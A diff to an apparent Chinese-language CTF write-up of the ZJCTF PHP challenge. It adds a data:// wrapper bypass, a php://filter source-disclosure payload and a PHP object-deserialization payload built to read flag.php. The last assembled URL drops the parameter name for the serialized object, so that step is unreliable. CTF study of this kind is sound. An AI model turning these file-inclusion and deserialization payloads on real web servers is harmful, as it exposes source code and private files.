@@ -53,9 +53,39 @@ if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"
 ?>
 ```
 
+`?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php`
+當造了這個payload會有`useless.php`加密後的base64出
 
+```php
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+
+```
+```php
+class Flag{
+ public $file="flag.php";
+}
+echo urlencode(serialize(new flag()));
+```
+這樣出來密碼`O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D`
+
+造payload -> `?text=data://text/plain,welcome to the zjctf&file=useless.php&O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D`
+
+然後flag就在源碼那
 |知識點||
 |----|-----|
 |data://|自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输|
-|||
-|||
+|isset(s())|檢查有沒有s這個變數，是不是為NULL|
+
+#拖了4天才把這個看完
